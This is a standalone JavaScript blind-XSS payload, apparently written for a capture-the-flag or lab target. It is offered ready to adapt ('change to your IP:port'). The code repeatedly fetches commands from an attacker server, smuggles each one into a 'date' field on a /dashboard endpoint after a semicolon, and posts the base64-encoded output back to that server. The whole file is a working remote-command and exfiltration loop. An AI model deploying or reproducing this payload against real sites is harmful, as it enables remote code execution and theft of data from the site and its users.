// Minimal polling payload for blind XSS -> command injection
// Place this payload in a header (User-Agent) or stored field.
(function(){
  const server = 'http://10.10.14.37:5000'; // change to your IP:port
  const pollInterval = 3000; // ms

  async function fetchCmd(){
    try{
      const r = await fetch(server + '/cmd.txt', {cache: 'no-store'});
      if(!r.ok) return;
      const cmd = (await r.text()).trim();
      if(!cmd) return;
      // send the command into an injectable endpoint on the current site
      // this example assumes there is a POST /dashboard accepting `date` param
      // adapt to the target app's injectable parameter
      const payload = 'date=2023-09-15;'+encodeURIComponent(cmd);
      // fire-and-forget to avoid breaking page behaviour
      navigator.sendBeacon('/dashboard', payload);
      // optionally capture output via a secondary endpoint that echoes back
      // For targets that return command output in the response, use fetch and POST it back.
      // Here we attempt a fetch and base64-post the response to attacker server
      try{
        const res = await fetch('/dashboard', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:payload});
        const text = await res.text();
        const b = btoa(unescape(encodeURIComponent(text)));
        await fetch(server + '/result', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'out='+encodeURIComponent(b)});
      }catch(e){}
    }catch(e){}
  }

  setInterval(fetchCmd, pollInterval);
})();
